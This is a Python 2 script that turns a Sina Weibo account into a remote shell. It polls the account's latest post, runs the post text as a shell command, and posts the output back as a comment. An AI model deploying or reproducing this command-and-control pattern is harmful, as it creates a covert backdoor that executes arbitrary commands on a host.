#-*- encoding: UTF-8 -*-
#---------------------------------import------------------------------------
import urllib2
import urllib
import time
import subprocess
from weibo import APIClient
#---------------------------------------------------------------------------
APP_KEY = '' # app key
APP_SECRET = '' # app secret
CALLBACK_URL = '' # callback url
AUTH_URL = ''
USERID = '' # userid
PASSWD = '' #password

def GetCode(userid, passwd):
    """获取用户code"""
    print 'Get the code...',
    client = APIClient(app_key = APP_KEY, app_secret = APP_SECRET, redirect_uri = CALLBACK_URL)
    referer_url = client.get_authorize_url()
    postdata = {
        "action": "login",
        "client_id": APP_KEY,
        "redirect_uri":CALLBACK_URL,
        "userId": userid,
        "passwd": passwd,
        }
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0",
        "Referer":referer_url,
        "Connection":"keep-alive"
    }
    req = urllib2.Request(
        url = AUTH_URL,
        data = urllib.urlencode(postdata),
        headers = headers
    )
    resp = urllib2.urlopen(req)
    print 'success!!!'
    return resp.geturl()[-32:]

def login(code):
    print 'Login...',
    client = APIClient(app_key = APP_KEY, app_secret = APP_SECRET, redirect_uri = CALLBACK_URL)
    r = client.request_access_token(code)
    access_token = r.access_token # 新浪返回的token，类似abc123xyz456
    expires_in = r.expires_in # token过期的UNIX时间：http://zh.wikipedia.org/wiki/UNIX%E6%97%B6%E9%97%B4
    client.set_access_token(access_token, expires_in)
    print 'success!!!'
    return client


############################################################################
def main():
    """获取用户第一条评论,当第一条微博改变时,进行命令执行,并在微博评论处返回执行信息"""
    code = GetCode(USERID, PASSWD)
    client = login(code)
    UID = client.account.get_uid.get()['uid'] # 获取用户uid,可用于评论
    text = client.statuses.user_timeline.get(uid = UID)
    ids = text['statuses'][0]['id']
    ID = ids
    while True:
        text = client.statuses.user_timeline.get(uid = UID)
        com = text['statuses'][0]['text']
        ids = text['statuses'][0]['id']
        print time.ctime(),com
        if ids != ID and com:
            tmp = subprocess.check_output(com,shell = True)
            tmp = tmp[:140] # 140字限制
            client.comments.create.post(comment = tmp, id = ids)
            print tmp
            ID = ids
        time.sleep(10) # ip限制1000次/小时

if __name__ == '__main__':
    main()
